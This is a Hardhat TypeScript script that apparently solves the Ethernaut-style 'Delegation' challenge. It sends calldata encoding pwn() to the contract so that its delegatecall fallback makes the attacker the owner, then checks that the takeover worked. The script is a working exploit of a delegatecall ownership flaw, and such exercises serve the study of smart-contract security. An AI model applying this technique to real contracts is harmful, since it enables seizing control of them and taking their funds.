import { ethers, network } from "hardhat";
import { Delegation } from "../typechain-types/target/Delegation.sol";

async function main() {
  const [attacker] = await ethers.getSigners();
  const chainId = network.config.chainId;
  let delegation: Delegation;

  const isLocalTest = chainId === 31337;

  if (isLocalTest) {
    delegation = await ethers.getContract("Delegation");
  } else {
    delegation = await ethers.getContractAt(
      "Delegation",
      "0x8830B8f4E6e9581775e750171266cC7D5Acd289f"
    );
  }

  const owner = await delegation.owner();
  console.log(`Owner: ${owner}`);
  console.log(`Attacker: ${attacker.address}`);

  let ABI = ["function pwn()"];
  let iface = new ethers.utils.Interface(ABI);
  const data = iface.encodeFunctionData("pwn");
  console.log(`data: ${data}`);
  //console.log(ethers.utils.keccak256(ethers.utils.toUtf8Bytes(ABI[0])));

  const tx = await attacker.sendTransaction({
    to: delegation.address,
    data: data,
    gasLimit: 8000000,
  });

  await tx.wait(isLocalTest ? 1 : 4);

  const newOwner = await delegation.owner();

  console.log(newOwner);
  console.log(attacker.address);
  console.log(newOwner == attacker.address);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
